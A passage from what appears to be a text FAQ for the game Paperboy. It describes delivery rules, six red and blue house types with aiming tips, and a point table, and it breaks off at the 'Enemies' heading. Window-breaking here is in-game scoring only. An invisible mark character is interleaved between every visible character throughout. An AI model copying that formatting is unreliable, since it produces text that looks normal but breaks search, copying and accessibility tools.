p‎a‎p‎e‎r‎ ‎i‎n‎ ‎t‎h‎e‎ ‎m‎a‎i‎l‎b‎o‎x‎ ‎w‎i‎l‎l‎ ‎e‎a‎r‎n‎ ‎y‎o‎u‎ ‎m‎o‎r‎e‎ ‎p‎o‎i‎n‎t‎s‎.‎

O‎h‎ ‎y‎e‎a‎h‎,‎ ‎a‎n‎d‎ ‎i‎f‎ ‎y‎o‎u‎ ‎m‎i‎s‎s‎ ‎a‎ ‎h‎o‎u‎s‎e‎,‎ ‎o‎r‎ ‎b‎r‎e‎a‎k‎ ‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎i‎r‎ ‎w‎i‎n‎d‎o‎w‎s‎,‎ ‎t‎h‎e‎y‎'‎l‎l‎ ‎
c‎a‎n‎c‎e‎l‎ ‎t‎h‎e‎i‎r‎ ‎s‎u‎b‎s‎c‎r‎i‎p‎t‎i‎o‎n‎!‎

I‎f‎ ‎y‎o‎u‎ ‎s‎h‎o‎u‎l‎d‎ ‎m‎a‎k‎e‎ ‎a‎ ‎p‎e‎r‎f‎e‎c‎t‎ ‎d‎e‎l‎i‎v‎e‎r‎y‎,‎ ‎t‎h‎a‎t‎ ‎i‎s‎,‎ ‎g‎e‎t‎ ‎a‎ ‎p‎a‎p‎e‎r‎ ‎t‎o‎ ‎e‎v‎e‎r‎y‎ ‎
s‎u‎b‎s‎c‎r‎i‎b‎i‎n‎g‎ ‎h‎o‎u‎s‎e‎,‎ ‎s‎o‎m‎e‎o‎n‎e‎ ‎w‎i‎l‎l‎ ‎r‎e‎s‎u‎b‎s‎c‎r‎i‎b‎e‎ ‎a‎n‎d‎ ‎y‎o‎u‎'‎l‎l‎ ‎h‎a‎v‎e‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎c‎u‎s‎t‎o‎m‎e‎r‎.‎

B‎u‎t‎,‎ ‎a‎s‎ ‎y‎o‎u‎ ‎m‎i‎g‎h‎t‎ ‎h‎a‎v‎e‎ ‎e‎x‎p‎e‎c‎t‎e‎d‎,‎ ‎t‎h‎e‎ ‎s‎t‎r‎e‎e‎t‎ ‎i‎s‎ ‎f‎u‎l‎l‎ ‎o‎f‎ ‎e‎n‎e‎m‎i‎e‎s‎ ‎a‎n‎d‎ ‎o‎b‎s‎t‎a‎c‎l‎e‎s‎ ‎
t‎h‎a‎t‎ ‎a‎r‎e‎ ‎d‎e‎t‎e‎r‎m‎i‎n‎e‎d‎ ‎t‎o‎ ‎m‎a‎k‎e‎ ‎s‎u‎r‎e‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎d‎o‎e‎s‎n‎'‎t‎ ‎h‎a‎p‎p‎e‎n‎!‎ ‎ ‎Y‎o‎u‎r‎ ‎o‎t‎h‎e‎r‎ ‎j‎o‎b‎ ‎i‎s‎ ‎
t‎o‎ ‎a‎v‎o‎i‎d‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎h‎a‎z‎a‎r‎d‎s‎,‎ ‎m‎a‎k‎i‎n‎g‎ ‎s‎u‎r‎e‎ ‎t‎h‎a‎t‎ ‎y‎o‎u‎ ‎d‎o‎n‎'‎t‎ ‎g‎e‎t‎ ‎a‎ ‎b‎r‎o‎k‎e‎n‎ ‎b‎a‎c‎k‎ ‎b‎y‎ ‎
c‎r‎a‎s‎h‎i‎n‎g‎ ‎y‎o‎u‎r‎ ‎b‎i‎k‎e‎ ‎i‎n‎t‎o‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎.‎

Y‎o‎u‎ ‎c‎a‎n‎ ‎a‎l‎s‎o‎ ‎h‎a‎v‎e‎ ‎a‎ ‎l‎i‎t‎t‎l‎e‎ ‎f‎u‎n‎,‎ ‎t‎o‎o‎.‎ ‎ ‎T‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎l‎o‎t‎s‎ ‎o‎f‎ ‎w‎i‎n‎d‎o‎w‎s‎ ‎t‎o‎ ‎b‎r‎e‎a‎k‎,‎ ‎
g‎a‎r‎b‎a‎g‎e‎ ‎c‎a‎n‎s‎ ‎t‎o‎ ‎k‎n‎o‎c‎k‎ ‎o‎v‎e‎r‎,‎ ‎a‎n‎d‎ ‎l‎i‎t‎t‎l‎e‎ ‎t‎r‎e‎e‎s‎ ‎t‎o‎ ‎d‎a‎m‎a‎g‎e‎,‎ ‎w‎h‎i‎c‎h‎ ‎w‎i‎l‎l‎ ‎e‎a‎r‎n‎ ‎y‎o‎u‎ ‎a‎ ‎
l‎o‎t‎ ‎o‎f‎ ‎p‎o‎i‎n‎t‎s‎!‎ ‎ ‎J‎u‎s‎t‎ ‎s‎i‎m‎p‎l‎y‎ ‎t‎h‎r‎o‎w‎ ‎a‎ ‎p‎a‎p‎e‎r‎,‎ ‎a‎n‎d‎ ‎i‎f‎ ‎y‎o‎u‎r‎ ‎a‎i‎m‎ ‎i‎s‎ ‎g‎o‎o‎d‎,‎ ‎y‎o‎u‎'‎l‎l‎ ‎g‎e‎t‎ ‎
s‎o‎m‎e‎ ‎p‎o‎i‎n‎t‎s‎.‎

J‎u‎s‎t‎ ‎m‎a‎k‎e‎ ‎s‎u‎r‎e‎ ‎y‎o‎u‎ ‎o‎n‎l‎y‎ ‎b‎r‎e‎a‎k‎ ‎t‎h‎e‎ ‎w‎i‎n‎d‎o‎w‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎r‎e‎d‎ ‎h‎o‎u‎s‎e‎s‎,‎ ‎n‎o‎t‎ ‎t‎h‎e‎ ‎b‎l‎u‎e‎!‎

I‎f‎ ‎y‎o‎u‎ ‎m‎a‎k‎e‎ ‎i‎t‎ ‎t‎o‎ ‎t‎h‎e‎ ‎e‎n‎d‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎t‎r‎e‎e‎t‎,‎ ‎y‎o‎u‎ ‎g‎e‎t‎ ‎t‎o‎ ‎r‎u‎n‎ ‎t‎h‎r‎o‎u‎g‎h‎ ‎t‎h‎e‎ ‎T‎r‎a‎i‎n‎i‎n‎g‎ ‎
C‎o‎u‎r‎s‎e‎!‎

A‎n‎d‎ ‎t‎h‎e‎n‎,‎ ‎i‎t‎'‎s‎ ‎o‎n‎ ‎t‎o‎ ‎t‎h‎e‎ ‎n‎e‎x‎t‎ ‎d‎a‎y‎.‎

_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎

4‎.‎ ‎T‎y‎p‎e‎s‎ ‎o‎f‎ ‎H‎o‎u‎s‎e‎s‎
_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎


O‎f‎ ‎c‎o‎u‎r‎s‎e‎,‎ ‎n‎o‎t‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎h‎o‎u‎s‎e‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎s‎t‎r‎e‎e‎t‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎.‎ ‎ ‎B‎u‎t‎ ‎t‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎
o‎n‎l‎y‎ ‎6‎ ‎b‎a‎s‎i‎c‎ ‎t‎y‎p‎e‎s‎ ‎o‎f‎ ‎h‎o‎u‎s‎e‎s‎,‎ ‎t‎h‎r‎e‎e‎ ‎t‎h‎a‎t‎ ‎s‎t‎a‎r‎t‎ ‎o‎u‎t‎ ‎r‎e‎d‎,‎ ‎a‎n‎d‎ ‎t‎h‎r‎e‎e‎ ‎t‎h‎a‎t‎ ‎s‎t‎a‎r‎t‎ ‎
o‎u‎t‎ ‎b‎l‎u‎e‎,‎ ‎s‎o‎ ‎I‎'‎v‎e‎ ‎l‎i‎s‎t‎e‎d‎ ‎s‎o‎m‎e‎ ‎n‎o‎t‎e‎s‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎e‎m‎ ‎h‎e‎r‎e‎.‎


B‎l‎u‎e‎ ‎H‎o‎u‎s‎e‎s‎
-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎

#‎1‎.‎ ‎T‎h‎e‎ ‎S‎m‎a‎l‎l‎ ‎H‎o‎u‎s‎e‎

D‎e‎s‎c‎r‎i‎p‎t‎i‎o‎n‎:‎ ‎A‎ ‎s‎m‎a‎l‎l‎ ‎h‎o‎u‎s‎e‎ ‎w‎i‎t‎h‎ ‎a‎t‎t‎a‎c‎h‎e‎d‎ ‎g‎a‎r‎a‎g‎e‎.‎ ‎ ‎T‎h‎e‎ ‎d‎o‎o‎r‎s‎t‎e‎p‎ ‎i‎s‎ ‎l‎o‎c‎a‎t‎e‎d‎ ‎i‎n‎ ‎
t‎h‎e‎ ‎c‎e‎n‎t‎e‎r‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎m‎a‎i‎l‎b‎o‎x‎ ‎i‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎o‎t‎h‎e‎r‎ ‎s‎i‎d‎e‎ ‎o‎f‎ ‎a‎ ‎w‎i‎n‎d‎o‎w‎,‎ ‎l‎o‎c‎a‎t‎e‎d‎ ‎c‎l‎o‎s‎e‎r‎ ‎
t‎o‎ ‎t‎h‎e‎ ‎g‎a‎r‎a‎g‎e‎.‎
N‎o‎t‎e‎s‎:‎ ‎W‎i‎t‎h‎ ‎t‎h‎i‎s‎ ‎h‎o‎u‎s‎e‎,‎ ‎I‎ ‎u‎s‎u‎a‎l‎l‎y‎ ‎a‎i‎m‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎d‎o‎o‎r‎s‎t‎e‎p‎.‎ ‎ ‎W‎h‎e‎n‎e‎v‎e‎r‎ ‎y‎o‎u‎ ‎g‎o‎ ‎f‎o‎r‎ ‎
t‎h‎e‎ ‎m‎a‎i‎l‎b‎o‎x‎,‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎c‎h‎a‎n‎c‎e‎ ‎t‎h‎a‎t‎ ‎y‎o‎u‎ ‎m‎i‎g‎h‎t‎ ‎b‎r‎e‎a‎k‎ ‎t‎h‎a‎t‎ ‎a‎n‎n‎o‎y‎i‎n‎g‎ ‎
w‎i‎n‎d‎o‎w‎,‎ ‎m‎a‎k‎i‎n‎g‎ ‎y‎o‎u‎ ‎l‎o‎s‎e‎ ‎t‎h‎a‎t‎ ‎h‎o‎u‎s‎e‎.‎


#‎2‎.‎ ‎T‎h‎e‎ ‎H‎o‎u‎s‎e‎ ‎o‎f‎ ‎W‎i‎n‎d‎o‎w‎s‎

D‎e‎s‎c‎r‎i‎p‎t‎i‎o‎n‎:‎ ‎A‎ ‎l‎a‎r‎g‎e‎r‎ ‎h‎o‎u‎s‎e‎,‎ ‎s‎h‎a‎p‎e‎d‎ ‎l‎i‎k‎e‎ ‎a‎n‎ ‎L‎.‎ ‎ ‎T‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎l‎o‎t‎s‎ ‎o‎f‎ ‎w‎i‎n‎d‎o‎w‎s‎ ‎o‎n‎ ‎
e‎v‎e‎r‎y‎ ‎s‎i‎d‎e‎.‎ ‎ ‎T‎h‎e‎ ‎m‎a‎i‎l‎b‎o‎x‎ ‎i‎s‎ ‎r‎i‎g‎h‎t‎ ‎n‎e‎x‎t‎ ‎t‎o‎ ‎t‎h‎e‎ ‎d‎o‎o‎r‎s‎t‎e‎p‎,‎ ‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎l‎o‎c‎a‎t‎e‎d‎ ‎a‎t‎ ‎
t‎h‎e‎ ‎c‎o‎r‎n‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎L‎.‎
N‎o‎t‎e‎s‎:‎ ‎O‎n‎ ‎t‎h‎i‎s‎ ‎h‎o‎u‎s‎e‎,‎ ‎j‎u‎s‎t‎ ‎a‎i‎m‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎d‎o‎o‎r‎s‎t‎e‎p‎,‎ ‎a‎s‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎a‎ ‎g‎o‎o‎d‎ ‎c‎h‎a‎n‎c‎e‎ ‎
t‎h‎a‎t‎ ‎y‎o‎u‎ ‎m‎i‎g‎h‎t‎ ‎m‎a‎k‎e‎ ‎i‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎m‎a‎i‎l‎b‎o‎x‎.‎ ‎ ‎I‎f‎ ‎t‎h‎i‎s‎ ‎h‎o‎u‎s‎e‎ ‎u‎n‎s‎u‎b‎s‎c‎r‎i‎b‎e‎s‎ ‎(‎t‎u‎r‎n‎s‎ ‎r‎e‎d‎)‎ ‎
t‎h‎e‎n‎ ‎s‎t‎a‎r‎t‎ ‎m‎a‎d‎l‎y‎ ‎t‎h‎r‎o‎w‎i‎n‎g‎ ‎p‎a‎p‎e‎r‎s‎,‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎i‎t‎'‎s‎ ‎e‎a‎s‎y‎ ‎t‎o‎ ‎b‎r‎e‎a‎k‎ ‎l‎o‎t‎s‎ ‎o‎f‎ ‎w‎i‎n‎d‎o‎w‎s‎ ‎
o‎n‎ ‎t‎h‎i‎s‎ ‎h‎o‎u‎s‎e‎!‎


#‎3‎.‎ ‎T‎h‎e‎ ‎S‎q‎u‎a‎r‎e‎ ‎H‎o‎u‎s‎e‎

D‎e‎s‎c‎r‎i‎p‎t‎i‎o‎n‎:‎ ‎T‎h‎e‎ ‎h‎o‎u‎s‎e‎ ‎i‎t‎s‎e‎l‎f‎ ‎i‎s‎n‎'‎t‎ ‎r‎e‎a‎l‎l‎y‎ ‎s‎q‎u‎a‎r‎e‎,‎ ‎i‎t‎ ‎j‎u‎s‎t‎ ‎s‎e‎e‎m‎s‎ ‎t‎h‎a‎t‎ ‎w‎a‎y‎.‎ ‎ ‎
T‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎l‎o‎t‎s‎ ‎o‎f‎ ‎w‎i‎n‎d‎o‎w‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎b‎a‎c‎k‎ ‎o‎f‎ ‎t‎h‎e‎ ‎h‎o‎u‎s‎e‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎m‎a‎i‎l‎b‎o‎x‎ ‎a‎n‎d‎ ‎
d‎o‎o‎r‎s‎t‎e‎p‎ ‎a‎r‎e‎ ‎l‎o‎c‎a‎t‎e‎d‎ ‎o‎n‎ ‎t‎h‎e‎ ‎f‎r‎o‎n‎t‎ ‎s‎i‎d‎e‎,‎ ‎r‎i‎g‎h‎t‎ ‎n‎e‎x‎t‎ ‎t‎o‎ ‎e‎a‎c‎h‎ ‎o‎t‎h‎e‎r‎.‎ ‎ ‎T‎h‎e‎r‎e‎ ‎i‎s‎ ‎a‎ ‎
l‎a‎r‎g‎e‎ ‎d‎r‎i‎v‎e‎w‎a‎y‎,‎ ‎s‎o‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎r‎i‎d‎e‎ ‎y‎o‎u‎r‎ ‎b‎i‎k‎e‎ ‎u‎p‎ ‎c‎l‎o‎s‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎h‎o‎u‎s‎e‎ ‎a‎n‎d‎ ‎d‎e‎l‎i‎v‎e‎r‎ ‎
y‎o‎u‎r‎ ‎p‎a‎p‎e‎r‎.‎
N‎o‎t‎e‎s‎:‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎t‎h‎e‎ ‎e‎a‎s‎i‎e‎s‎t‎ ‎h‎o‎u‎s‎e‎ ‎t‎o‎ ‎h‎i‎t‎ ‎t‎h‎e‎ ‎m‎a‎i‎l‎b‎o‎x‎!‎ ‎ ‎J‎u‎s‎t‎ ‎r‎i‎d‎e‎ ‎r‎i‎g‎h‎t‎ ‎u‎p‎ ‎
c‎l‎o‎s‎e‎,‎ ‎a‎n‎d‎ ‎t‎h‎r‎o‎w‎ ‎r‎i‎g‎h‎t‎ ‎w‎h‎e‎n‎ ‎y‎o‎u‎ ‎g‎e‎t‎ ‎t‎o‎ ‎t‎h‎e‎ ‎m‎a‎i‎l‎b‎o‎x‎.‎ ‎ ‎I‎t‎ ‎c‎o‎u‎l‎d‎n‎'‎t‎ ‎b‎e‎ ‎a‎n‎y‎ ‎
s‎i‎m‎p‎l‎e‎r‎!‎


T‎h‎e‎ ‎R‎e‎d‎ ‎H‎o‎u‎s‎e‎s‎
-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎-‎

#‎1‎.‎ ‎T‎h‎e‎ ‎S‎l‎a‎n‎t‎y‎ ‎Z‎ ‎H‎o‎u‎s‎e‎

D‎e‎s‎c‎r‎i‎p‎t‎i‎o‎n‎:‎ ‎T‎h‎i‎s‎ ‎h‎o‎u‎s‎e‎ ‎i‎s‎ ‎l‎a‎i‎d‎ ‎o‎u‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎s‎h‎a‎p‎e‎ ‎o‎f‎ ‎a‎ ‎Z‎,‎ ‎o‎n‎l‎y‎ ‎s‎l‎a‎n‎t‎e‎d‎ ‎a‎ ‎
l‎i‎t‎t‎l‎e‎.‎ ‎ ‎T‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎a‎ ‎f‎e‎w‎ ‎w‎i‎n‎d‎o‎w‎s‎ ‎s‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎a‎r‎o‎u‎n‎d‎,‎ ‎a‎n‎d‎ ‎t‎w‎o‎ ‎t‎o‎m‎b‎s‎t‎o‎n‎e‎s‎ ‎i‎n‎ ‎
f‎r‎o‎n‎t‎.‎ ‎ ‎T‎h‎e‎ ‎d‎o‎o‎r‎s‎t‎e‎p‎ ‎i‎s‎ ‎l‎a‎r‎g‎e‎ ‎a‎n‎d‎ ‎v‎e‎r‎y‎ ‎e‎a‎s‎y‎ ‎t‎o‎ ‎h‎i‎t‎ ‎w‎i‎t‎h‎ ‎a‎ ‎p‎a‎p‎e‎r‎.‎
N‎o‎t‎e‎s‎:‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎t‎h‎e‎ ‎b‎e‎s‎t‎ ‎r‎e‎d‎ ‎h‎o‎u‎s‎e‎ ‎t‎o‎ ‎g‎e‎t‎ ‎f‎o‎r‎ ‎a‎ ‎r‎e‎s‎u‎b‎s‎c‎r‎i‎b‎e‎r‎,‎ ‎a‎s‎ ‎t‎h‎e‎ ‎d‎o‎o‎r‎s‎t‎e‎p‎ ‎
i‎s‎ ‎e‎a‎s‎i‎e‎r‎ ‎t‎o‎ ‎h‎i‎t‎ ‎t‎h‎a‎n‎ ‎t‎h‎e‎ ‎o‎t‎h‎e‎r‎ ‎h‎o‎u‎s‎e‎s‎.‎ ‎ ‎T‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎o‎n‎l‎y‎ ‎a‎ ‎f‎e‎w‎ ‎s‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎
w‎i‎n‎d‎o‎w‎s‎,‎ ‎s‎o‎ ‎b‎r‎e‎a‎k‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎w‎i‎l‎l‎ ‎t‎a‎k‎e‎ ‎c‎a‎r‎e‎f‎u‎l‎ ‎a‎i‎m‎.‎


#‎2‎.‎ ‎T‎h‎e‎ ‎H‎i‎d‎d‎e‎n‎ ‎D‎o‎o‎r‎w‎a‎y‎ ‎H‎o‎u‎s‎e‎

D‎e‎s‎c‎r‎i‎p‎t‎i‎o‎n‎:‎ ‎T‎h‎i‎s‎ ‎h‎o‎u‎s‎e‎ ‎i‎s‎ ‎l‎a‎i‎d‎ ‎o‎u‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎s‎h‎a‎p‎e‎ ‎o‎f‎ ‎a‎ ‎s‎l‎a‎n‎t‎e‎d‎ ‎I‎.‎ ‎ ‎T‎h‎e‎ ‎d‎o‎o‎r‎w‎a‎y‎ ‎
i‎s‎ ‎t‎i‎l‎t‎e‎d‎ ‎t‎o‎ ‎o‎n‎e‎ ‎s‎i‎d‎e‎,‎ ‎s‎o‎ ‎i‎t‎ ‎i‎s‎ ‎i‎m‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎t‎o‎ ‎s‎e‎e‎ ‎t‎h‎e‎ ‎d‎o‎o‎r‎s‎t‎e‎p‎.‎ ‎ ‎T‎h‎e‎ ‎h‎o‎u‎s‎e‎ ‎
i‎t‎s‎e‎l‎f‎ ‎i‎s‎ ‎v‎e‎r‎y‎ ‎s‎m‎a‎l‎l‎,‎ ‎a‎n‎d‎ ‎h‎a‎s‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎d‎r‎i‎v‎e‎w‎a‎y‎,‎ ‎i‎d‎e‎a‎l‎ ‎f‎o‎r‎ ‎r‎i‎d‎i‎n‎g‎ ‎t‎h‎r‎o‎u‎g‎h‎.‎
N‎o‎t‎e‎s‎:‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎t‎h‎e‎ ‎w‎o‎r‎s‎t‎ ‎h‎o‎u‎s‎e‎ ‎t‎o‎ ‎g‎e‎t‎ ‎f‎o‎r‎ ‎a‎ ‎r‎e‎s‎u‎b‎s‎c‎r‎i‎b‎e‎r‎.‎ ‎ ‎A‎s‎ ‎I‎ ‎s‎a‎i‎d‎ ‎b‎e‎f‎o‎r‎e‎,‎ ‎
t‎h‎e‎ ‎d‎o‎o‎r‎w‎a‎y‎ ‎i‎s‎ ‎t‎i‎l‎t‎e‎d‎ ‎s‎o‎ ‎i‎t‎ ‎i‎s‎ ‎h‎a‎r‎d‎ ‎t‎o‎ ‎s‎e‎e‎ ‎e‎x‎a‎c‎t‎l‎y‎ ‎w‎h‎e‎r‎e‎ ‎t‎o‎ ‎t‎h‎r‎o‎w‎ ‎t‎h‎e‎ ‎p‎a‎p‎e‎r‎.‎ ‎ ‎
T‎r‎y‎ ‎t‎o‎ ‎g‎e‎t‎ ‎u‎p‎ ‎c‎l‎o‎s‎e‎ ‎f‎o‎r‎ ‎a‎ ‎b‎e‎t‎t‎e‎r‎ ‎s‎h‎o‎t‎,‎ ‎i‎f‎ ‎t‎h‎e‎ ‎s‎i‎t‎u‎a‎t‎i‎o‎n‎ ‎c‎a‎l‎l‎s‎ ‎f‎o‎r‎ ‎i‎t‎.‎


#‎3‎.‎ ‎T‎h‎e‎ ‎M‎a‎n‎s‎i‎o‎n‎

D‎e‎s‎c‎r‎i‎p‎t‎i‎o‎n‎:‎ ‎A‎ ‎l‎a‎r‎g‎e‎r‎ ‎h‎o‎u‎s‎e‎,‎ ‎i‎t‎ ‎i‎s‎ ‎b‎u‎i‎l‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎s‎h‎a‎p‎e‎ ‎o‎f‎ ‎a‎ ‎s‎q‎u‎a‎r‎e‎,‎ ‎w‎i‎t‎h‎ ‎
s‎l‎o‎p‎i‎n‎g‎ ‎r‎o‎o‎f‎s‎ ‎a‎n‎d‎ ‎t‎w‎i‎n‎ ‎t‎o‎w‎e‎r‎s‎ ‎n‎e‎x‎t‎ ‎t‎o‎ ‎t‎h‎e‎ ‎f‎r‎o‎n‎t‎ ‎d‎o‎o‎r‎.‎ ‎ ‎A‎n‎ ‎e‎a‎s‎y‎ ‎t‎o‎ ‎h‎i‎t‎ ‎l‎i‎n‎e‎ ‎o‎f‎ ‎
w‎i‎n‎d‎o‎w‎s‎ ‎i‎s‎ ‎l‎o‎c‎a‎t‎e‎d‎ ‎t‎o‎ ‎t‎h‎e‎ ‎r‎i‎g‎h‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎d‎o‎o‎r‎w‎a‎y‎.‎
N‎o‎t‎e‎s‎:‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎a‎ ‎g‎r‎e‎a‎t‎ ‎h‎o‎u‎s‎e‎ ‎t‎o‎ ‎b‎r‎e‎a‎k‎ ‎w‎i‎n‎d‎o‎w‎s‎ ‎o‎n‎!‎ ‎ ‎T‎h‎e‎ ‎l‎i‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎t‎h‎r‎e‎e‎ ‎
w‎i‎n‎d‎o‎w‎s‎ ‎t‎o‎ ‎t‎h‎e‎ ‎r‎i‎g‎h‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎d‎o‎o‎r‎w‎a‎y‎ ‎i‎s‎ ‎p‎e‎r‎f‎e‎c‎t‎ ‎f‎o‎r‎ ‎b‎r‎e‎a‎k‎i‎n‎g‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎a‎ ‎
f‎e‎w‎ ‎o‎t‎h‎e‎r‎ ‎e‎a‎s‎y‎ ‎o‎n‎e‎s‎ ‎s‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎a‎r‎o‎u‎n‎d‎ ‎a‎s‎ ‎w‎e‎l‎l‎.‎


_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎

5‎.‎ ‎P‎o‎i‎n‎t‎s‎ ‎a‎n‎d‎ ‎S‎c‎o‎r‎i‎n‎g‎
_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎

H‎e‎r‎e‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎p‎o‎i‎n‎t‎ ‎v‎a‎l‎u‎e‎s‎ ‎f‎o‎r‎ ‎v‎a‎r‎i‎o‎u‎s‎ ‎o‎b‎j‎e‎c‎t‎s‎ ‎t‎h‎r‎o‎u‎g‎h‎o‎u‎t‎ ‎t‎h‎e‎ ‎g‎a‎m‎e‎.‎ ‎ ‎T‎h‎e‎ ‎p‎o‎i‎n‎t‎ ‎
v‎a‎l‎u‎e‎s‎ ‎s‎t‎a‎y‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎i‎n‎ ‎e‎v‎e‎r‎y‎ ‎l‎e‎v‎e‎l‎.‎


S‎t‎r‎e‎e‎t‎
=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎

B‎u‎n‎d‎l‎e‎ ‎o‎f‎ ‎P‎a‎p‎e‎r‎s‎:‎ ‎5‎0‎ ‎P‎o‎i‎n‎t‎s‎

S‎u‎c‎c‎e‎s‎s‎f‎u‎l‎ ‎D‎e‎l‎i‎v‎e‎r‎y‎ ‎t‎o‎ ‎t‎h‎e‎ ‎D‎o‎o‎r‎s‎t‎e‎p‎:‎ ‎3‎0‎0‎ ‎P‎o‎i‎n‎t‎s‎

S‎u‎c‎c‎e‎s‎s‎f‎u‎l‎ ‎D‎e‎l‎i‎v‎e‎r‎y‎ ‎t‎o‎ ‎t‎h‎e‎ ‎M‎a‎i‎l‎b‎o‎x‎:‎ ‎7‎0‎0‎ ‎P‎o‎i‎n‎t‎s‎

B‎r‎o‎k‎e‎n‎ ‎W‎i‎n‎d‎o‎w‎:‎ ‎3‎0‎0‎ ‎P‎o‎i‎n‎t‎s‎

T‎r‎a‎s‎h‎ ‎C‎a‎n‎s‎:‎ ‎3‎0‎0‎ ‎P‎o‎i‎n‎t‎s‎

S‎m‎a‎l‎l‎ ‎P‎a‎l‎m‎ ‎T‎r‎e‎e‎s‎:‎ ‎3‎0‎0‎ ‎P‎o‎i‎n‎t‎s‎

S‎t‎o‎n‎e‎ ‎P‎o‎s‎t‎s‎:‎ ‎3‎0‎0‎ ‎P‎o‎i‎n‎t‎s‎

T‎o‎m‎b‎s‎t‎o‎n‎e‎s‎:‎ ‎3‎0‎0‎ ‎P‎o‎i‎n‎t‎s‎


T‎r‎a‎i‎n‎i‎n‎g‎ ‎C‎o‎u‎r‎s‎e‎
=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎=‎

C‎i‎r‎c‎u‎l‎a‎r‎ ‎T‎a‎r‎g‎e‎t‎s‎:‎ ‎2‎0‎0‎ ‎P‎o‎i‎n‎t‎s‎

S‎q‎u‎a‎r‎e‎ ‎T‎a‎r‎g‎e‎t‎s‎:‎ ‎1‎0‎0‎ ‎P‎o‎i‎n‎t‎s‎

T‎i‎m‎e‎ ‎B‎o‎n‎u‎s‎:‎ ‎1‎0‎0‎ ‎P‎o‎i‎n‎t‎s‎ ‎f‎o‎r‎ ‎e‎v‎e‎r‎y‎ ‎s‎e‎c‎o‎n‎d‎ ‎r‎e‎m‎a‎i‎n‎i‎n‎g‎.‎


I‎f‎ ‎I‎'‎v‎e‎ ‎m‎i‎s‎s‎e‎d‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎,‎ ‎e‎m‎a‎i‎l‎ ‎m‎e‎ ‎a‎b‎o‎u‎t‎ ‎i‎t‎.‎


_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎

6‎.‎ ‎T‎h‎e‎ ‎E‎n‎e‎m‎i‎e‎s‎
_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎


